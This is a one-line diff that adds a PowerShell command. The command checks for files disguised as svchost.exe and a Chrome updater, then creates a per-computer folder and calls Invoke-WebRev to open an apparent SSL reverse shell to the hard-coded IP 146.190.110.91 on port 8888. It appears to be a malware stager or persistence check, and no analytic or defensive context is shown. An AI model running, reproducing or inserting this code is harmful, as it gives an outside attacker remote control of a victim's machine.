@@ -1,0 +1,1 @@
+if((Test-Path 'C:\Program Files\Windows Conf\svchost.exe') -and (Test-Path 'C:\Program Files\google\chrome\updater.exe')){exit} else {md C:\T\$env:computername;cd C:\T\$env:computername;Invoke-WebRev -ip 146.190.110.91 -port 8888 -ssl}
